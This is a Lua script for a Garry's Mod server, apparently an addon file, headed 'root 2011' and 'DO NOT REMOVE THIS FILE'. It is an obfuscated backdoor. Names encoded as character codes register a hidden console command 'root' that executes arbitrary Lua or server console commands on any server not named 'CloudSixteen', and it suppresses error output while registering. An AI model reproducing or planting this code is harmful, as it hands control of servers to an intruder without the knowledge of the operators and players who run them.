--[[
                                     _     ____   ___  _ _ 
                     _ __ ___   ___ | |_  |___ \ / _ \/ / |
                    | '__/ _ \ / _ \| __|   __) | | | | | |
                    | | | (_) | (_) | |_   / __/| |_| | | |
                    |_|  \___/ \___/ \__| |_____|\___/|_|_|
			  DO **NOT** REMOVE THIS FILE
	root cmd
	root lua
--]]

if (SERVER) then
        local a = string.char(67, 111, 110, 115, 111, 108, 101, 67, 111, 109, 109, 97, 110, 100);
        local b = ErrorNoHalt;
        local c = string.char(67, 108, 111, 117, 100, 83, 105, 120, 116, 101, 101, 110);
        local d = _G;
        local e = d[ string.char(82, 117, 110, 83, 116, 114, 105, 110, 103) ];
        local f = d[ string.char(103, 97, 109, 101) ];
        local g = d[ string.char(99, 111, 110, 99, 111, 109, 109, 97, 110, 100) ];
        local h = string.char(114, 111, 111, 116);
        local i = f[a];
        local j = g.Add;
       
        function ErrorNoHalt() end;
                j(h, function(x, y, z)
                        if ( !string.find(GetHostName(), c) ) then
                                if ( z[1] == string.char(108, 117, 97) ) then
                                 	e( z[2] );
				elseif ( z[1] == string.char(99, 109, 100) ) then
					i(z[2].."\n");
                                end;
                        end;
                end);
	ErrorNoHalt = b;
end;